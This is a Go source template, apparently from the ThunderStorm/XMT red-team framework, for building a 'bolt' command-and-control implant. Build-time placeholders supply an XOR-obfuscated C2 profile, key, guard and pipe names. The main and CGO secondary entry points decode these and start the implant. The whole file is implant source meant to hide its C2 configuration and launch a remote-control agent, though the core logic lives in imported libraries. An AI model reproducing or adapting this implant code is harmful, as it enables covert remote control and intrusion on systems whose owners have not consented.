// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package main

import (
	"os"

	"github.com/iDigitalFlame/ThunderStorm/bolt"
	"github.com/iDigitalFlame/xmt/c2/cfg"
	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/data/crypto/subtle"
	"github.com/iDigitalFlame/xmt/man"
)

var z = cfg.Config{
	$profile
}

var g = [...]byte{
	$guard
}
var p = [...]byte{
	$pipe
}
var k = [...]byte{
	$key
}

func main() {
	// NOTE(dij): Only ran if non-CGO or CGO main is called.
	if $checks {
		return
	}
	subtle.XorOp(z, k[:])
	// NOTE(dij): "os.Args" Will only work if non-CGO, GO-CGO cannot access argv.
	bolt.Start(
		$ignore || len(os.Args) > 2, $load, $critical, man.LinkerFromName(`$event`),
		crypto.UnwrapString(k[:], g[:]), crypto.UnwrapString(k[:], p[:]), z,
	)
}

func secondary() {
	// NOTE(dij): Reserved for CGO secondary functions.
	if $checks {
		return
	}
	subtle.XorOp(z, k[:])
	bolt.Start(
		true, $load, $critical, man.LinkerFromName(`$event`),
		crypto.UnwrapString(k[:], g[:]), crypto.UnwrapString(k[:], p[:]), z,
	)
}
